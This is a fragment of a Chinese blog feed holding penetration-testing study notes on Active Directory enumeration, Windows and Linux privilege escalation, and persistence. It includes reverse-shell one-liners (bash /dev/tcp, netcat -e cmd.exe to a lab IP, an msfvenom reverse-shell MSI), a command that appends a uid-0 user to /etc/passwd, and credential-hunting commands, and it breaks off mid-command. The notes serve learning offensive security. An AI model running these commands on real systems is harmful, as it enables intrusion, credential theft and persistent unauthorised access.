        <content type="html"><![CDATA[<h1 id="目标"><a href="#目标" class="headerlink" title="目标"></a>目标</h1><p>域渗透的目标就是拿下DC，dump域hash，维持域权限，从而可以控制整个域。</p><h1 id="前置知识"><a href="#前置知识" class="headerlink" title="前置知识"></a>前置知识</h1><h2 id="工作组与域"><a href="#工作组与域" class="headerlink" title="工作组与域"></a>工作组与域</h2><p><a href="https://apt404.github.io/2016/08/10/workgroup-domain-dc/">工作组,域,域控是什么及它们之间的一些关系 | APT404-不作恶</a></p><blockquote><p>  工作组就是把一些具有相同职能(比如,可以按部门,按房间号,按岗位,按操作系统类型等的不同进行分组管理)的机器都放到一个组里。</p><p>  实际上工作组只是形式上的把大家放在了一起而已,并不存在真正的集中管理作用,工作组内的每台机器依然是相互独立,互不干涉,各自为政的。如果要访问工作组中其他主机的资源，需要提供该主机的账号密码。</p><p>  域，通过域管理员管理域控（DC）来对域内主机进行管理，要想访问域内主机资源，就要成为域内用户，并受限于身份。</p><p>  域管理员可以任意操作域内的任意一台主机（当主机加入域中时，域控就会向该主机的本地管理组中加入域管理员账户）</p><p>  域控服务器上的用户默认为域用户</p><p>  AD（ Active Directory ）：保存域用户身份凭证</p></blockquote><h2 id="Windows身份认证机制"><a href="#Windows身份认证机制" class="headerlink" title="Windows身份认证机制"></a>Windows身份认证机制</h2><p><a href="https://ares-x.com/2020/03/16/%E5%9F%9F%E6%B8%97%E9%80%8F%E5%AD%A6%E4%B9%A0%EF%BC%88%E4%B8%80%EF%BC%89Windows%E8%AE%A4%E8%AF%81%E6%9C%BA%E5%88%B6/">域渗透学习（一）Windows认证机制 | AresX’s Blog</a></p><h3 id="本地认证"><a href="#本地认证" class="headerlink" title="本地认证"></a>本地认证</h3><blockquote><p>指用户直接操作计算机登陆账户</p></blockquote><p>![image-20230331000339946](E:\typora img\image-20230331000339946.png)</p><p>本地认证中用来处理用户输入密码的进程即lsass.exe,密码会在这个进程中明文保存，供该进程将密码计算成NTLM Hash与sam进行比对。我们使用mimikatz来获取的明文密码，便是在这个进程中读取到的</p><h3 id="网络认证netNTLM"><a href="#网络认证netNTLM" class="headerlink" title="网络认证netNTLM"></a>网络认证netNTLM</h3><p>挑战响应机制</p><p>![image-20230601124340615](E:\typora img\image-20230601124340615.png)</p><h3 id="域认证–Kerberos协议"><a href="#域认证–Kerberos协议" class="headerlink" title="域认证–Kerberos协议"></a>域认证–Kerberos协议</h3><p><a href="https://ares-x.com/2020/03/17/%E5%9F%9F%E6%B8%97%E9%80%8F%E5%AD%A6%E4%B9%A0%EF%BC%88%E4%BA%8C%EF%BC%89Kerberos%E5%8D%8F%E8%AE%AE/">域渗透学习（二）Kerberos协议 | AresX’s Blog</a></p><p>![image-20230330213515103](E:\typora img\image-20230330213515103.png)</p><p>参与认证的三个角色的NTLM Hash是三个密钥，这三个NTLM Hash的唯一作用是确保会话密钥Sessionkey的安全传输</p><h4 id="验证身份"><a href="#验证身份" class="headerlink" title="验证身份"></a>验证身份</h4><p>收到两个消息，都是先用自己的NTLM哈希进行解密，得到会话密钥和cilent id，时间戳，再用会话密钥对另一个消息进行解密，得到另一组cilent id和时间戳，将解密得到的这两组cilent id和时间戳进行比较，如果相同，则验证成功。</p><h4 id="黄金票据TGT-Ticket-Granting-Ticket"><a href="#黄金票据TGT-Ticket-Granting-Ticket" class="headerlink" title="黄金票据TGT(Ticket Granting Ticket)"></a>黄金票据TGT(Ticket Granting Ticket)</h4><blockquote><p>用于身份认证，存储在内存，默认有效期为10小时</p></blockquote><p>内容为<strong>Client&#x2F;TGS Sessionkey</strong>和<strong>cilent id，时间戳</strong>，由KDC中的AS用<strong>KDC密钥（即TGS密钥&#x2F;KDC服务器krbtgt用户的NTLM Hash）</strong>加密得到</p><p>（向KDC请求身份认证，所以用KDC密钥加密）</p><h4 id="白银票据TGS-Ticket-Granting-Server"><a href="#白银票据TGS-Ticket-Granting-Server" class="headerlink" title="白银票据TGS(Ticket Granting Server)"></a>白银票据TGS(Ticket Granting Server)</h4><p>内容为<strong>Client&#x2F;Server Sessionkey</strong>和<strong>cilent id，时间戳</strong>,由KDC中的TGS用**Server密钥(服务器的NTLMHASH)**加密得到</p><p>（向Server请求服务，所以用Server密钥加密）</p><h1 id="域信息收集"><a href="#域信息收集" class="headerlink" title="域信息收集"></a>域信息收集</h1><h2 id="环境"><a href="#环境" class="headerlink" title="环境"></a>环境</h2><img src="../../../typora img/2752372-20220719180949017-1117785613.png" alt="image" style="zoom: 200%;" /><h2 id="域用户"><a href="#域用户" class="headerlink" title="域用户"></a>域用户</h2><h3 id="判断是否存在域"><a href="#判断是否存在域" class="headerlink" title="判断是否存在域"></a>判断是否存在域</h3><figure class="highlight powershell"><table><tr><td class="code"><pre><span class="line">ipconfig /all</span><br></pre></td></tr></table></figure><p><img src="/../../../blog/source/images/image-20230320152802672-1693107475017.png" alt="image-20230320152802672"></p><figure class="highlight powershell"><table><tr><td class="code"><pre><span class="line">systeminfo | findstr 域</span><br><span class="line">systeminfo | findstr Domain</span><br></pre></td></tr></table></figure><p><img src="/../../../blog/source/images/image-20230320152858151-1693107475019.png" alt="image-20230320152858151"></p><figure class="highlight powershell"><table><tr><td class="code"><pre><span class="line">net config workstation | findstr 域</span><br><span class="line">net config workstation | findstr Domain</span><br></pre></td></tr></table></figure><p><img src="/../../../blog/source/images/image-20230320153121788-1693107475019.png" alt="image-20230320153121788"></p><figure class="highlight powershell"><table><tr><td class="code"><pre><span class="line">net time /domain</span><br></pre></td></tr></table></figure><p><img src="/../../../blog/source/images/image-20230320153225917-1693107475019.png" alt="image-20230320153225917"></p><blockquote><p>1.存在域，但当前用户不是域用户，提示权限不够  C:\Users&gt;net time &#x2F;domain  发生系统错误 5  拒绝访问。</p><p>2.存在域，并且当前用户是域用户 ,结果如上图所示</p><p>3.当前网络环境为工作组，提示不存在域   C:\Users\Administrator&gt;net time &#x2F;domain   找不到域 WORKGROUP 的域控制器。</p></blockquote><h3 id="查找域控制器"><a href="#查找域控制器" class="headerlink" title="查找域控制器"></a><strong>查找域控制器</strong></h3><p><img src="/../../../blog/source/images/image-20230320154005520-1693107475019.png" alt="image-20230320154005520"></p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">nslookup 时间服务器</span><br></pre></td></tr></table></figure><blockquote><p>一般时间服务器就是域控机器，可以ping获取其IP</p></blockquote><h3 id="获取域内用户和管理员信息"><a href="#获取域内用户和管理员信息" class="headerlink" title="获取域内用户和管理员信息"></a><strong>获取域内用户和管理员信息</strong></h3><ul><li><p>查询域内所有用户组列表</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">net group /domain</span><br></pre></td></tr></table></figure><p><img src="/../../../blog/source/images/image-20230320154822831-1693107475019.png" alt="image-20230320154822831"></p></li><li><p>查看所有域成员计算机列表（域中主机数）</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">net group &quot;domain computers&quot; /domain</span><br></pre></td></tr></table></figure><p><img src="/../../../blog/source/images/image-20230320155412592-1693107475019.png" alt="image-20230320155412592"></p></li><li><p>查询域管理员列表</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">net group &quot;Domain Admins&quot; /domain</span><br></pre></td></tr></table></figure><p><img src="/../../../blog/source/images/image-20230320154932181-1693107475020.png" alt="image-20230320154932181"></p></li><li><p>获取所有域用户列表</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">net user /domain</span><br></pre></td></tr></table></figure><p><img src="/../../../blog/source/images/image-20230320155019174-1693107475020.png" alt="image-20230320155019174"></p></li><li><p>查询域中内置本地管理员组用户</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">net localgroup administrators /domain</span><br></pre></td></tr></table></figure><p><img src="/../../../blog/source/images/image-20230320155142902-1693107475020.png" alt="image-20230320155142902"></p></li><li><p>获取域内用户的详细信息</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">wmic useraccount get /all</span><br></pre></td></tr></table></figure><p><img src="/../../../blog/source/images/image-20230324161931493-1693107475020.png" alt="image-20230324161931493"></p></li></ul><h2 id="非域用户"><a href="#非域用户" class="headerlink" title="非域用户"></a>非域用户</h2><p>用户枚举</p><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">./kerbrute userenum -d spookysec.local --dc spookysec.local user.txt -t 100</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> 渗透测试 </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>Windows、Linux提权学习</title>
      <link href="/2023/05/01/%E6%8F%90%E6%9D%83/"/>
      <url>/2023/05/01/%E6%8F%90%E6%9D%83/</url>
      
        <content type="html"><![CDATA[<h2 id="提权的本质"><a href="#提权的本质" class="headerlink" title="提权的本质"></a>提权的本质</h2><p><strong>利用权限配置的失误</strong></p><h2 id="数据库提权"><a href="#数据库提权" class="headerlink" title="数据库提权"></a>数据库提权</h2><blockquote><p>需要服务器开启数据库服务及获取到最高权限用户密码。</p><p>除 Access 数据库外，其他数据库基本都存在数据库提权的可能。</p></blockquote><p><a href="https://www.sqlsec.com/2020/11/mysql.html">MYSQL 国光师傅总结</a></p><p>UDF提权只能获得mysql的运行权限，对于linux系统，默认给mysql分配一个”mysql:mysql”用户，所以对于linux系统来说这个给提权没啥意义。</p><p><img src="/../images/14483f65ba5d4390940eaf054d71b0f9-1693976641900.png" alt="fs"></p><h2 id="Linux提权"><a href="#Linux提权" class="headerlink" title="Linux提权"></a>Linux提权</h2><h3 id="suid"><a href="#suid" class="headerlink" title="suid"></a>suid</h3><p><a href="https://www.leavesongs.com/PENETRATION/linux-suid-privilege-escalation.html">原理</a></p><p><a href="https://gtfobins.github.io/">利用</a></p><p><img src="/../images/image-20230220142509956.png" alt="image-20230220142509956"></p><blockquote><p>suid全称是<strong>S</strong>et owner <strong>U</strong>ser <strong>ID</strong> up on execution。这是Linux给可执行文件的一个属性。</p><p>设置了s位的程序在运行时，其<strong>Effective UID</strong>将会设置为这个程序的所有者。比如，<code>/bin/ping</code>这个程序的所有者是0（root），它设置了s位，那么普通用户在运行ping时其<strong>Effective UID</strong>就是0，等同于拥有了root权限。</p></blockquote><p><img src="/../images/image-20230220142233418.png" alt="image-20230220142233418"></p><p>查找具有s位权限的命令</p><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">find / -user root -perm -4000 -print 2&gt;/dev/null</span><br><span class="line">find / -perm -u=s -type f 2&gt;/dev/null</span><br><span class="line">find / -user root -perm -4000 -exec ls -ldb &#123;&#125; ;</span><br></pre></td></tr></table></figure><p>常见suid提权命令</p><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">find . -exec command \;</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">./vim -c &#x27;:python3 import os; os.setuid(0); os.execl(&quot;/bin/sh&quot;, &quot;sh&quot;, &quot;-c&quot;, &quot;reset; exec sh&quot;)&#x27;</span><br></pre></td></tr></table></figure><h3 id="sudo"><a href="#sudo" class="headerlink" title="sudo"></a>sudo</h3><blockquote><p>sudo：super user do</p><p>sudo -l查找哪些命令可以以root权限执行</p><p>使用这些命令创建一个新shell即可提权</p></blockquote><p><img src="/../images/image-20230220161114377.png" alt="image-20230220161114377"></p><p><img src="/../images/image-20230220161140688.png" alt="image-20230220161140688"></p><p>在vi的ESC模式下输入<code>!/bin/bash</code>后按下回车即可变为root权限。</p><h3 id="passwd追加用户提权"><a href="#passwd追加用户提权" class="headerlink" title="passwd追加用户提权"></a>passwd追加用户提权</h3><h4 id="teehee"><a href="#teehee" class="headerlink" title="teehee"></a>teehee</h4><p>teehee是个小众的linux编辑器。如果有sudo权限。可以利用其来提权</p><p>核心思路就是利用其在passwd文件中追加一条uid为0的用户条目</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">echo &quot;raaj::0:0:::/bin/bash&quot; | sudo teehee -a /etc/passwd</span><br></pre></td></tr></table></figure><p>按照linux用户机制，如果没有shadow条目，且passwd用户密码条目为空的时候，可以本地直接su空密码登录（空密码不能远程登录）。所以只需要执行su raaj就可以登录到raaj用户，这个用户因为uid为0，所以也是root权限</p><h3 id="命令劫持提权"><a href="#命令劫持提权" class="headerlink" title="命令劫持提权"></a>命令劫持提权</h3><p>本质上还是suid提权，只不过具有suid权限的命令是用户自定义的，调用了其他命令，我们可以通过劫持调用的其他命令来提权。</p><p>比如有一个root用户自定义的具有suid权限的test命令，调用了系统命令ls，那我们可以找到一个可写目录，通过修改$PATH环境变量，劫持ls命令。</p><h3 id="Capabilities提权"><a href="#Capabilities提权" class="headerlink" title="Capabilities提权"></a>Capabilities提权</h3><p>原理跟suid类似</p><p>查找具有capabilities权限的可执行文件</p><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">getcap -r / 2&gt;/dev/null</span><br></pre></td></tr></table></figure><p>利用还是看GTOBINS</p><h3 id="进程漏洞提权"><a href="#进程漏洞提权" class="headerlink" title="进程漏洞提权"></a>进程漏洞提权</h3><p>进程监视工具<a href="https://github.com/DominicBreuker/pspy/releases">pspy</a></p><h4 id="Polkit：CVE-2021-3560"><a href="#Polkit：CVE-2021-3560" class="headerlink" title="Polkit：CVE-2021-3560"></a>Polkit：CVE-2021-3560</h4><p>exp：<a href="https://github.com/Almorabea/Polkit-exploit">https://github.com/Almorabea/Polkit-exploit</a></p><p>分析：<a href="https://cloud.tencent.com/developer/article/1856693">https://cloud.tencent.com/developer/article/1856693</a></p><h3 id="脏牛dirtycow"><a href="#脏牛dirtycow" class="headerlink" title="脏牛dirtycow"></a>脏牛dirtycow</h3><p><a href="https://blog.csdn.net/weixin_46944519/article/details/123402495">https://blog.csdn.net/weixin_46944519/article/details/123402495</a></p><p>官方</p><p><a href="https://github.com/dirtycow/dirtycow.github.io/wiki/PoCs">https://github.com/dirtycow/dirtycow.github.io/wiki/PoCs</a></p><h3 id="定时任务提权"><a href="#定时任务提权" class="headerlink" title="定时任务提权"></a>定时任务提权</h3><p>定时任务以root权限运行，但是低权限用户可以修改定时任务的内容</p><h3 id="工具"><a href="#工具" class="headerlink" title="工具"></a>工具</h3><p><a href="https://www.freebuf.com/articles/network/274223.html">https://www.freebuf.com/articles/network/274223.html</a></p><h2 id="Windows提权"><a href="#Windows提权" class="headerlink" title="Windows提权"></a>Windows提权</h2><h3 id="前置知识"><a href="#前置知识" class="headerlink" title="前置知识"></a>前置知识</h3><p><a href="https://blog.csdn.net/fuhanghang/article/details/128786603">Windows的权限（用户、组和访问控制）_</a></p><h3 id="目的"><a href="#目的" class="headerlink" title="目的"></a>目的</h3><p>从 Webshell、数据库权—&gt; 系统普通用户权限—&gt;Administrator 权限—&gt;System 权限</p><h3 id="手法"><a href="#手法" class="headerlink" title="手法"></a>手法</h3><p><img src="/../images/1605453393_5fb146513192ec6c15dae.png!small" alt="1605453393_5fb146513192ec6c15dae.png!small"></p><h4 id="系统配置错误"><a href="#系统配置错误" class="headerlink" title="系统配置错误"></a>系统配置错误</h4><p>工具</p><p><a href="https://github.com/mertdas/PrivKit">mertdas&#x2F;PrivKit: PrivKit is a simple beacon object file that detects privilege escalation vulnerabilities caused by misconfigurations on Windows OS. (github.com)</a></p><p>检查清单</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Checks for Unquoted Service Paths</span><br><span class="line">Checks for Autologon Registry Keys</span><br><span class="line">Checks for Always Install Elevated Registry Keys</span><br><span class="line">Checks for Modifiable Autoruns</span><br><span class="line">Checks for Hijackable Paths</span><br><span class="line">Enumerates Credentials From Credential Manager</span><br><span class="line">Looks for current Token Privileges</span><br></pre></td></tr></table></figure><p>该工具为CS的插件，导入后在beacon中使用</p><figure class="highlight powershell"><table><tr><td class="code"><pre><span class="line">beacon&gt; privcheck</span><br></pre></td></tr></table></figure><h5 id="可信任服务路径漏洞"><a href="#可信任服务路径漏洞" class="headerlink" title="可信任服务路径漏洞"></a>可信任服务路径漏洞</h5><p><img src="/../images/20201014150247256.png" alt="img"></p><p><strong>路径没有包含在引号中，服务会按照以下顺序依次执行</strong></p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">c:\program.exe</span><br><span class="line">c:\program files.exe</span><br><span class="line">c:\program files (x86)\grasssoft\macro.exe</span><br><span class="line">c:\program files (x86)\grasssoft\macro expert\MacroService.exe</span><br></pre></td></tr></table></figure><p>可以看到 Windows 尝试执行了四次才找到真正的程序。</p><p>由于 Windows 服务通常是以 SYSTEM 权限运行的，所以在系统找到空格前的程序并执行时，也将以 SYSTEM 权限运行这个程序。</p><p>即我们把木马程序命名为 Program.exe ，然后放到 C 盘下，当上面的服务重启时，系统就会执行我们的木马程序。</p><p>可以使用以下命令查看系统中错误配置的路径</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">wmic service get name,displayname,pathname,startmode |findstr /i &quot;Auto&quot; |findstr /i /v &quot;C:\Windows\\&quot; |findstr /i /v &quot;&quot;&quot;</span><br></pre></td></tr></table></figure><h5 id="配置文件"><a href="#配置文件" class="headerlink" title="配置文件"></a>配置文件</h5><figure class="highlight powershell"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 自动安装配置文件</span></span><br><span class="line">C:\Unattend.xml</span><br><span class="line">C:\Windows\Panther\Unattend.xml</span><br><span class="line">C:\Windows\Panther\Unattend\Unattend.xml</span><br><span class="line">C:\Windows\system32\sysprep.inf</span><br><span class="line">C:\Windows\system32\sysprep\sysprep.xml</span><br></pre></td></tr></table></figure><figure class="highlight powershell"><table><tr><td class="code"><pre><span class="line"><span class="comment"># IIS配置文件</span></span><br><span class="line">C:\inetpub\wwwroot\web.config</span><br><span class="line">C:\Windows\Microsoft.NET\Framework64\v4.<span class="number">0.30319</span>\Config\web.config</span><br><span class="line"></span><br><span class="line"><span class="comment"># 搜索凭证</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">type</span> C:\Windows\Microsoft.NET\Framework64\v4.<span class="number">0.30319</span>\Config\web.config | findstr connectionString</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">PuTTY是Windows系统上常见的SSH客户端。用户不必每次都指定连接的参数，而是可以将会话存储在IP、用户和其他配置可以存储的地方，以供以后使用。虽然PuTTY不允许用户存储他们的SSH密码，但它会存储包括明文身份验证凭据的代理配置。</span><br><span class="line"></span><br><span class="line">要检索存储的代理凭证，您可以使用以下命令在以下注册表项下搜索ProxyPassword:</span><br><span class="line">reg query HKEY_CURRENT_USER\Software\SimonTatham\PuTTY\Sessions\ /f &quot;Proxy&quot; /s</span><br><span class="line"></span><br><span class="line">注意:Simon Tatham是PuTTY的创建者(他的名字是路径的一部分)，而不是我们正在检索密码的用户名。运行上述命令后，存储的代理用户名也应该是可见的。</span><br><span class="line"></span><br><span class="line">就像putty存储凭据一样，任何存储密码的软件，包括浏览器、电子邮件客户端、FTP客户端、SSH客户端、VNC软件等，都有恢复用户保存的任何密码的方法。</span><br></pre></td></tr></table></figure><h5 id="定时任务"><a href="#定时任务" class="headerlink" title="定时任务"></a>定时任务</h5><figure class="highlight powershell"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 查询定时任务</span></span><br><span class="line">schtasks /query</span><br><span class="line"><span class="comment"># 查看权限</span></span><br><span class="line">icacls</span><br><span class="line"><span class="comment"># 写入</span></span><br><span class="line"><span class="built_in">echo</span> c:\tools\nc64.exe <span class="literal">-e</span> cmd.exe  <span class="number">10.17</span>.<span class="number">16.148</span>  <span class="number">1234</span> &gt; C:\tasks\schtask.bat</span><br></pre></td></tr></table></figure><h5 id="恶意msi安装程序"><a href="#恶意msi安装程序" class="headerlink" title="恶意msi安装程序"></a>恶意msi安装程序</h5><p>前置条件</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">reg query HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer</span><br><span class="line">reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer</span><br></pre></td></tr></table></figure><p>msf生成恶意msi</p><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">msfvenom -p windows/x64/shell_reverse_tcp LHOST=ATTACKING_10.10.63.3 LPORT=LOCAL_PORT -f msi -o malicious.msi</span><br></pre></td></tr></table></figure><p>受害机执行</p><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">msiexec /quiet /qn /i C:\Windows\Temp\malicious.msi</span><br></pre></td></tr></table></figure><p>或者使用exploit&#x2F;windows&#x2F;local&#x2F;always_install_elevated模块</p><h4 id="历史命令"><a href="#历史命令" class="headerlink" title="历史命令"></a>历史命令</h4><ul><li><p>cmd</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">type %userprofile%\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadline\ConsoleHost_history.txt</span><br></pre></td></tr></table></figure></li><li><p>powershell</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">type $Env:userprofile\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadline\ConsoleHost_history.txt</span><br></pre></td></tr></table></figure></li></ul><h4 id="Saved-Windows-Credentials"><a href="#Saved-Windows-Credentials" class="headerlink" title="Saved Windows Credentials"></a>Saved Windows Credentials</h4><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">cmdkey /list</span><br><span class="line">runas /savecred /user:admin cmd.exe</span><br></pre></td></tr></table></figure><p><img src="/../images/image-20230419221533716-1693976683312.png" alt="image-20230419221533716"></p><p>以这个用户权限开启一个新的cmd</p><h4 id="Bypass-UAC"><a href="#Bypass-UAC" class="headerlink" title="Bypass UAC"></a>Bypass UAC</h4><p>工具<a href="https://github.com/hfiref0x/UACME">hfiref0x&#x2F;UACME: Defeating Windows User Account Control (github.com)</a></p><h4 id="令牌窃取"><a href="#令牌窃取" class="headerlink" title="令牌窃取"></a>令牌窃取</h4><p>工具<a href="https://github.com/BeichenDream/SharpToken">BeichenDream&#x2F;SharpToken: Windows Token Stealing Expert (github.com)</a></p><blockquote><p>在红队横向移动期间，我们经常需要窃取其他用户的权限。在现代EDR的防御下，我们很难使用Mimikatz来获取其他用户权限，如果目标用户没有进程存活，我们也没有办法使用“OpenProcessToken”来窃取Token。</p><p>SharpToken是一个利用Token泄漏的工具。它可以从系统中的所有进程中找到泄漏的令牌并使用它们。如果您是低权限的服务用户，甚至可以使用它来升级到“NT AUTHORITY\SYSTEM”权限，并且可以切换到目标用户的桌面…</p></blockquote><h4 id="内核提权"><a href="#内核提权" class="headerlink" title="内核提权"></a>内核提权</h4><p>查找补丁情况来选择CVE打</p><h3 id="土豆系列"><a href="#土豆系列" class="headerlink" title="土豆系列"></a>土豆系列</h3><h4 id="烂土豆（Rotten-Potato）"><a href="#烂土豆（Rotten-Potato）" class="headerlink" title="烂土豆（Rotten Potato）"></a>烂土豆（Rotten Potato）</h4><p>烂土豆不适用于 &gt;&#x3D; Windows 10 1809 和 Windows Server 2019 的版本</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">https://github.com/foxglovesec/RottenPotato</span><br><span class="line"></span><br><span class="line">烂土豆配合MSF提权</span><br><span class="line">    使用令牌窃取进行提权</span><br><span class="line">    use incognito  （进入incognito模块）</span><br><span class="line">    通过MSF执行烂土豆</span><br><span class="line">    execute -cH -f RottenPotato.exe</span><br><span class="line">    list_tokens -u  （列出令牌）</span><br><span class="line">    impersonate_token &quot;NT AUTHORITY\\SYSTEM&quot;</span><br></pre></td></tr></table></figure><h4 id="烂土豆NG（Rotten-PotatoNG）"><a href="#烂土豆NG（Rotten-PotatoNG）" class="headerlink" title="烂土豆NG（Rotten PotatoNG）"></a>烂土豆NG（Rotten PotatoNG）</h4><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">https://github.com/antonioCoco/JuicyPotatoNG</span><br><span class="line"></span><br><span class="line">JuicyPotatoNG.exe -t * -p &quot;c:\Windows\System32\cmd.exe&quot; -a &quot;/c whaomi &gt; .\1.txt&quot;</span><br><span class="line"></span><br><span class="line">强制参数:-t createprocess call: &lt;t&gt; CreateProcessWithTokenW， &lt;u&gt; CreateProcessAsUser， &lt;*&gt;同时尝试</span><br><span class="line">-p &lt;program&gt;:要启动的程序可选参数</span><br><span class="line">-1 &lt;port&gt;: COM服务器监听端口(默认为10247)</span><br><span class="line">-a &lt;argument&gt;:传递给程序的命令行参数(默认为NULL)</span><br><span class="line">-c &lt;CLSID&gt;:(默认值&#123;854A20FB-2D44-457D-992F-EF13785D2B51&#125;)</span><br><span class="line">-i:交互式控制台(仅对CreateProcessAsUser有效)额外的模式</span><br><span class="line">-b:暴力破解所有clsid。alert:仅用于测试。大约会产生1000个进程!</span><br><span class="line">-s:寻找没有被Windows Defender防火墙过滤的合适COM端口</span><br></pre></td></tr></table></figure><h4 id="多汁土豆（Juicy-Potato）"><a href="#多汁土豆（Juicy-Potato）" class="headerlink" title="多汁土豆（Juicy Potato）"></a>多汁土豆（Juicy Potato）</h4><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">https://github.com/ohpe/juicy-potato</span><br><span class="line">http://ohpe.it/juicy-potato/CLSID/</span><br><span class="line">多汁土豆适用于&lt; Windows 10 1809 &lt; Windows Server 2019</span><br><span class="line">不需要 meterpreter shell，可以指定COM服务器侦听端口，可以选择CLSID</span><br><span class="line"></span><br><span class="line">查看当前用户权限，是否符合要求</span><br><span class="line">whoami /priv</span><br><span class="line">限制条件：需要支持SeImpersonate或者SeAssignPrimaryToken权限，开启DCOM，本地支持RPC或者远程服务器支持PRC并能成功登录，能够找到可用的COM对象</span><br><span class="line">    如果开启SeImpersonate权限，juicypotato的参数可以使用-t t</span><br><span class="line">    如果开启SeAssignPrimaryToken权限，juicypotato的参数可以使用-t u</span><br><span class="line">使用详情见https://github.com/ohpe/juicy-potato</span><br></pre></td></tr></table></figure><h4 id="多汁土豆NG（Juicy-PotatoNG）"><a href="#多汁土豆NG（Juicy-PotatoNG）" class="headerlink" title="多汁土豆NG（Juicy PotatoNG）"></a>多汁土豆NG（Juicy PotatoNG）</h4><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">https://github.com/antonioCoco/JuicyPotatoNG</span><br><span class="line">JuicyPotatoNG.exe -t * -p &quot;C:\windows\system32\cmd.exe&quot; -a &quot;/c whoami &gt; C:\JuicyPotatoNG.txt&quot;</span><br></pre></td></tr></table></figure><h4 id="RasmanPotato"><a href="#RasmanPotato" class="headerlink" title="RasmanPotato"></a>RasmanPotato</h4><p>Windows 10(11未测试)，Windows Server 2012 - 2019(2022未测试)</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">magicRasMan v0.1</span><br><span class="line">Provided that the current user has the SeImpersonate privilege, this tool will have an escalation to SYSTEM</span><br><span class="line">Arguments:</span><br><span class="line"> -c &lt;CMD&gt;       Execute the command *CMD*</span><br><span class="line"> -m &lt;METHOD&gt;            Choose The RPC Function [1]VpnProtEngWinRtConnect [2]VpnProtEngGetInterface</span><br><span class="line"> -i             Interact with the new process in the current command prompt (default is non-interactive)</span><br></pre></td></tr></table></figure><h4 id="DCOMPotato"><a href="#DCOMPotato" class="headerlink" title="DCOMPotato"></a>DCOMPotato</h4><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">https://github.com/zcgonvh/DCOMPotato</span><br></pre></td></tr></table></figure><h4 id="LocalPotato（CVE-2023-21746）"><a href="#LocalPotato（CVE-2023-21746）" class="headerlink" title="LocalPotato（CVE-2023-21746）"></a>LocalPotato（CVE-2023-21746）</h4><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">https://github.com/decoder-it/LocalPotato</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> 渗透测试 </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>后渗透之权限维持</title>
      <link href="/2023/05/01/%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81/"/>
      <url>/2023/05/01/%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81/</url>
      
        <content type="html"><![CDATA[<h1 id="权限维持的目的"><a href="#权限维持的目的" class="headerlink" title="权限维持的目的"></a>权限维持的目的</h1><blockquote><p>当获取到服务器的控制权后，为了防止服务器管理员发现和修补漏洞导致对服务器权限的丢失，测试人员往往需要一些手段（后门）来实现对目标服务器的持久化访问。</p><p>持久化访问（Persistence，权限维持）技术就是包括任何可以被测试人员用来在系统重启、更改用户凭据或其他可能造成访问中断的情况发生时保持对系统的访问技术。</p></blockquote><h2 id="注意点"><a href="#注意点" class="headerlink" title="注意点"></a>注意点</h2><p>大部分操作都需要高权限，所以应该在免杀和提权之后再做权限维持。</p><h1 id="Linux权限维持"><a href="#Linux权限维持" class="headerlink" title="Linux权限维持"></a>Linux权限维持</h1><h2 id="反弹shell"><a href="#反弹shell" class="headerlink" title="反弹shell"></a>反弹shell</h2><blockquote><p>攻击机监听端口</p><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">nc -lnvp port</span><br></pre></td></tr></table></figure><p>反弹shell生成：<a href="https://zgao.top/tools/reverse/">Online - Reverse Shell Generator</a></p></blockquote><p>常用到的如下</p><h3 id="bash"><a href="#bash" class="headerlink" title="bash"></a>bash</h3><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">bash -c <span class="string">&#x27;bash -i &gt;&amp; /dev/tcp/ip/port 0&gt;&amp;1&#x27;</span></span><br><span class="line"></span><br><span class="line">bash -c <span class="string">&quot;&#123;echo,base64(xx)&#125;|&#123;base64,-d&#125;|&#123;bash,-i&#125;&quot;</span></span><br></pre></td></tr></table></figure><h3 id="python"><a href="#python" class="headerlink" title="python"></a>python</h3><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">python -c <span class="string">&quot;import 